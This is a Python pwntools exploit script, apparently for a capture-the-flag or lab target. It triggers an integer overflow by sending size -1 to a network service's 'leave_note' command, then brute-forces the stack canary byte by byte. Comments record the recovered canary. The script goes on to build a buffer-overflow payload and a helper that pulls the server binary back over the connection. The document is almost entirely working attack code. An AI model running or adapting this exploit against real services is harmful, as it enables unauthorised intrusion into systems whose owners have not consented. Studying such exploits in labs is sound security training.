from pwn import *

context.log_level = 'error'

def give_a_try(addr, port, buf):
    log.info(f"try for  : {buf[-4:]}")
    io = remote(addr, port)
    io.sendline(b"pass")
    io.recvuntil(b"] >> ")
    # integer overflow
    io.sendline(b"leave_note")
    io.recvuntil(b"size:")
    io.sendline(b"-1")
    io.recvuntil(b"Received size : -1")
    # payload
    io.send(buf)
    res = io.recvall(timeout=1)
    if b"Shell" in res:
        print(f"great byte ! : {buf[-1]}")
        return 1
    return 0

# Bruteforce the server canary
canary = b""
buf = b"a"*256
for j in range(4):
    pld = buf + canary
    for i in range(256):
        if give_a_try("192.168.210.2", 4444, pld+bytes([i])):
            canary += bytes([i])
            break

print(f"canary is {canary}")


# 0x595a1800 cancary
#
#
# great byte ! : 0
# great byte ! : 253
# great byte ! : 215
# great byte ! : 148
# canary is b'\x00\xfd\xd7\x94'
# 0x94d7fd00


canary = 0x94d7fd00

pld  = b"a"*256
pld += p32(canary)

# Retrieve the binary from server and write to «insecure_shell» file
def retrieve_prgm():
    io.sendline(b"cat")
    io.recvuntil(b"filename: ")
    io.sendline(b"insecure_shell")
    prgm = io.recvall(timeout=3)
    open("insecure_shell", "wb").write(prgm)

